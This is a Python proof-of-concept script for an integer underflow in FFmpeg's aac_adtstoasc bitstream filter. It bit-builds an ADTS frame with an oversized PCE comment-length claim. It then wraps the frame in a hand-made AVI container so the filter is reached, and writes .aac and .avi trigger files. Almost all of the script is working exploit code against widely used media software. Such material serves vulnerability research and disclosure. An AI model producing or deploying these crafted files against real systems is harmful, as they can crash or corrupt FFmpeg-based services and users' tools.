#!/usr/bin/env python3
"""
PoC for CWE-191 integer underflow in aac_adtstoasc_filter()
libavcodec/bsf/aac_adtstoasc.c lines 82-95

Vulnerability:
  After stripping the 7-byte ADTS header, pkt->size = N (payload bytes).
  init_get_bits(&gb, pkt->data, pkt->size * 8) initialises the safe reader
  with a cap at pkt->size*8 + 8 bits.
  ff_copy_pce_data() consumes 56 bits of valid PCE structure then tries to
  read comment_size*8 = 0xFF*8 = 2040 more bits; the safe reader caps at
  pkt->size*8 + 8 bits.  Back in the filter:
      pkt->size -= get_bits_count(&gb)/8;   // = (N*8+8)/8 = N+1
  so pkt->size = N - (N+1) = -1.
  The function returns 0 (success) at line 120 with pkt->size == -1.

Container strategy:
  Raw .aac probing calls the AAC *decoder*, which fails on our malformed PCE,
  leaving sample_rate=0 and channels=0 so the muxer never opens its header
  and the BSF is never invoked.
  Instead we wrap the malicious ADTS frame in a minimal AVI file.  The AVI
  demuxer reads sample_rate and channels directly from the WAVEFORMATEX
  structure in the container, without decoding the audio payload.  FFmpeg
  then applies the aac_adtstoasc BSF automatically when copying to MP4.
  Because our packet starts with 0xFFF (ADTS sync), the BSF's early-exit
  check (line 51) does not fire, and the vulnerable PCE path is reached.
"""

import struct


# ---------------------------------------------------------------------------
# Bit-accurate ADTS / PCE construction
# ---------------------------------------------------------------------------

class BitWriter:
    """MSB-first bit writer."""
    def __init__(self):
        self.bits = []

    def write(self, value, nbits):
        for i in range(nbits - 1, -1, -1):
            self.bits.append((value >> i) & 1)

    def align_to_byte(self):
        rem = len(self.bits) % 8
        if rem:
            for _ in range(8 - rem):
                self.bits.append(0)

    def bit_count(self):
        return len(self.bits)

    def to_bytes(self):
        self.align_to_byte()
        result = bytearray()
        for i in range(0, len(self.bits), 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | self.bits[i + j]
            result.append(byte)
        return bytes(result)


def build_adts_header(payload_len):
    """
    7-byte ADTS fixed+variable header (no CRC).

    Sync = 0xFFF, MPEG-4, no CRC, AAC-LC (profile=1),
    sampling_freq_index=3 (48000 Hz), channel_config=0 → PCE required.
    """
    frame_length = 7 + payload_len
    bw = BitWriter()
    bw.write(0xFFF, 12)        # syncword
    bw.write(0, 1)             # ID: MPEG-4
    bw.write(0, 2)             # layer
    bw.write(1, 1)             # protection_absent: no CRC
    bw.write(1, 2)             # profile_objecttype: 01 = AAC-LC
    bw.write(3, 4)             # sampling_frequency_index: 3 = 48000 Hz
    bw.write(0, 1)             # private_bit
    bw.write(0, 3)             # channel_configuration = 0 ← PCE path!
    bw.write(0, 1)             # originality/copy
    bw.write(0, 1)             # home
    bw.write(0, 1)             # copyright_id_bit
    bw.write(0, 1)             # copyright_id_start
    bw.write(frame_length, 13) # aac_frame_length
    bw.write(0x7FF, 11)        # adts_buffer_fullness: VBR
    bw.write(0, 2)             # number_of_raw_data_blocks_in_frame: 0 → 1 block
    data = bw.to_bytes()
    assert len(data) == 7
    return data


def build_pce_payload():
    """
    PCE element payload that triggers the BSF integer underflow.

    Bit layout from start of payload:
      [0-2]   id_syn_ele = 5 (PCE)
      [3-12]  element_instance_tag(4)=0, object_type(2)=1, samp_freq_idx(4)=3
      [13-16] num_front_channel_elements = 1
      [17-20] num_side_channel_elements  = 0
      [21-24] num_back_channel_elements  = 0
      [25-26] num_lfe_channel_elements   = 0
      [27-29] num_assoc_data_elements    = 0
      [30-33] num_valid_cc_elements      = 0
      [34]    mono_mixdown_present       = 0
      [35]    stereo_mixdown_present     = 0
      [36]    matrix_mixdown_idx_present = 0
      [37-41] front[0]: pair_element(1)=0(SCE) + instance_tag(4)=0
              (five_bit_ch=1 → bits=5, reads 5 bits; 4-bit ch=0)
      [42-47] align_get_bits pads to byte 6 (bit 48)
      [48-55] comment_field_bytes = 0xFF = 255  ← OVERSIZED CLAIM
      [56-79] only 3 real bytes supplied (not 255)
              → safe reader hits cap at pkt->size*8+8, and
                 get_bits_count(&gb)/8 = pkt->size+1 → underflow
    """
    bw = BitWriter()

    # id_syn_ele = 5 (PCE)
    bw.write(5, 3)

    # 10-bit block: element_instance_tag(4) + object_type(2) + samp_freq_idx(4)
    bw.write(0, 4)   # element_instance_tag = 0
    bw.write(1, 2)   # object_type = 1 (LC)
    bw.write(3, 4)   # sampling_frequency_index = 3 (48000 Hz)

    # Channel element counts
    bw.write(1, 4)   # num_front  → five_bit_ch += 1
    bw.write(0, 4)   # num_side   → five_bit_ch += 0
    bw.write(0, 4)   # num_back   → five_bit_ch += 0
    bw.write(0, 2)   # num_lfe    → four_bit_ch += 0
    bw.write(0, 3)   # num_assoc  → four_bit_ch += 0
    bw.write(0, 4)   # num_cc     → five_bit_ch += 0

    # Mixdown presence flags (all absent)
    bw.write(0, 1)   # mono_mixdown_present
    bw.write(0, 1)   # stereo_mixdown_present
    bw.write(0, 1)   # matrix_mixdown_idx_present

    # Channel element descriptors: five_bit_ch=1 → bits=5 → reads 5 bits
    bw.write(0, 1)   # pair_element = 0 (SCE)
    bw.write(0, 4)   # instance_tag = 0

    # align_get_bits: pad bits 42-47 to reach byte boundary at bit 48
    bw.align_to_byte()

    # comment_field_bytes = 0xFF (255) — claims 255 bytes but only 3 follow
    bw.write(0xFF, 8)

    # Only 3 bytes of actual comment data (not 255).
    bw.write(0x41, 8)   # 'A'
    bw.write(0x41, 8)   # 'A'
    bw.write(0x41, 8)   # 'A'

    return bw.to_bytes()


def build_adts_frame():
    payload = build_pce_payload()
    header  = build_adts_header(len(payload))
    return header + payload, len(payload)


# ---------------------------------------------------------------------------
# Minimal AVI container builder
# ---------------------------------------------------------------------------

def le32(x):  return struct.pack('<I', x & 0xFFFFFFFF)
def le16(x):  return struct.pack('<H', x & 0xFFFF)
def fcc(s):   return s.encode('ascii')

def riff_chunk(tag, data):
    """Build a RIFF chunk: FourCC + size + data (padded to even)."""
    c = fcc(tag) + le32(len(data)) + data
    if len(data) % 2 == 1:
        c += b'\x00'
    return c

def riff_list(listtype, data):
    """Build a LIST chunk: 'LIST' + size + FourCC + data."""
    inner = fcc(listtype) + data
    return fcc('LIST') + le32(len(inner)) + inner


def build_avi(adts_frame):
    """
    Construct a minimal one-frame AVI file with AAC ADTS audio.

    The WAVEFORMATEX inside the AVI container stores sample_rate=48000 and
    channels=1 explicitly.  FFmpeg's AVI demuxer reads these directly
    (without decoding the audio payload), so avformat_find_stream_info()
    succeeds even though our ADTS frame has a malformed PCE.
    WAV codec tag 0x00FF = WAVE_FORMAT_RAW_AAC1 (ADTS AAC).
    """

    # AVIMAINHEADER (56 bytes)
    avi_main_hdr = (
        le32(33333)   +  # dwMicroSecPerFrame
        le32(50000)   +  # dwMaxBytesPerSec
        le32(0)       +  # dwPaddingGranularity
        le32(0x100)   +  # dwFlags: AVIF_ISINTERLEAVED
        le32(1)       +  # dwTotalFrames
        le32(0)       +  # dwInitialFrames
        le32(1)       +  # dwStreams
        le32(65536)   +  # dwSuggestedBufferSize
        le32(0)       +  # dwWidth
        le32(0)       +  # dwHeight
        b'\x00' * 16     # dwReserved[4]
    )
    assert len(avi_main_hdr) == 56

    # AVISTREAMHEADER for audio (56 bytes)
    avi_strm_hdr = (
        b'auds'       +  # fccType
        le32(0x00FF)  +  # fccHandler (AAC codec tag)
        le32(0)       +  # dwFlags
        le16(0)       +  # wPriority
        le16(0)       +  # wLanguage
        le32(0)       +  # dwInitialFrames
        le32(1)       +  # dwScale (denominator for dwRate)
        le32(48000)   +  # dwRate → sample rate = 48000 Hz
        le32(0)       +  # dwStart
        le32(1)       +  # dwLength (1 frame)
        le32(65536)   +  # dwSuggestedBufferSize
        le32(0xFFFFFFFF) +  # dwQuality = -1
        le32(0)       +  # dwSampleSize = 0 (variable for compressed)
        b'\x00' * 8      # rcFrame (RECT: left, top, right, bottom)
    )
    assert len(avi_strm_hdr) == 56

    # WAVEFORMATEX (18 bytes, cbSize=0, no extra bytes)
    wave_fmt = (
        le16(0x00FF)  +  # wFormatTag: WAVE_FORMAT_RAW_AAC1 (ADTS)
        le16(1)       +  # nChannels = 1 (mono)
        le32(48000)   +  # nSamplesPerSec = 48000 Hz
        le32(6000)    +  # nAvgBytesPerSec ≈ 48 kb/s
        le16(1)       +  # nBlockAlign
        le16(0)       +  # wBitsPerSample
        le16(0)          # cbSize = 0 → no extra data → par_in->extradata = NULL
    )
    assert len(wave_fmt) == 18

    strl  = riff_list('strl',
                riff_chunk('strh', avi_strm_hdr) +
                riff_chunk('strf', wave_fmt))
    hdrl  = riff_list('hdrl',
                riff_chunk('avih', avi_main_hdr) + strl)

    # movi list: stream 00 (first/only stream), audio ('wb')
    # AVI stream chunk IDs are '##TT' where ## = zero-padded stream index (0-based)
    # and TT = type ('wb' for audio, 'dc' for video).  Our only stream is index 0.
    audio_chunk = riff_chunk('00wb', adts_frame)
    movi  = riff_list('movi', audio_chunk)

    # idx1: one entry for the '00wb' chunk.
    # The offset field is relative to the start of the 'movi' LIST DATA
    # (i.e. right after the 'movi' FourCC that starts the LIST payload).
    # Our '00wb' chunk starts immediately after that 4-byte 'movi' tag.
    movi_data_start = 4   # skip the 'movi' FourCC inside the LIST
    idx1_entry = (
        fcc('00wb')  +
        le32(0x10)   +         # AVIIF_KEYFRAME
        le32(movi_data_start) + # offset to '00wb' chunk from start of movi data
        le32(len(adts_frame))  # chunk size (unpadded)
    )
    idx1 = riff_chunk('idx1', idx1_entry)

    avi_body = fcc('AVI ') + hdrl + movi + idx1
    return fcc('RIFF') + le32(len(avi_body)) + avi_body


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    adts_frame, payload_len = build_adts_frame()

    print(f"[*] ADTS frame ({len(adts_frame)} bytes): {adts_frame.hex()}")
    print()
    print(f"[*] After BSF strips 7-byte ADTS header: pkt->size = {payload_len}")
    print(f"[*] Safe reader cap: {payload_len}*8+8 = {payload_len*8+8} bits")
    print(f"[*] Expected get_bits_count(&gb)/8 = {payload_len + 1}")
    print(f"[*] Expected pkt->size after line 94: "
          f"{payload_len} - {payload_len+1} = {payload_len - (payload_len+1)}")

    # Write raw .aac (for reference / alternative testing)
    with open("vuln_001_input.aac", "wb") as f:
        f.write(adts_frame)
    print(f"\n[+] Written: vuln_001_input.aac (raw ADTS, probe fails due to malformed PCE)")

    # Write AVI wrapper (main trigger path)
    avi_bytes = build_avi(adts_frame)
    with open("vuln_001_input.avi", "wb") as f:
        f.write(avi_bytes)
    print(f"[+] Written: vuln_001_input.avi ({len(avi_bytes)} bytes)")
    print(f"    AVI WAVEFORMATEX stores sample_rate=48000, channels=1 directly;")
    print(f"    demuxer reads these without decoding the audio payload, so")
    print(f"    avformat_find_stream_info() succeeds and the BSF is invoked.")


if __name__ == "__main__":
    main()
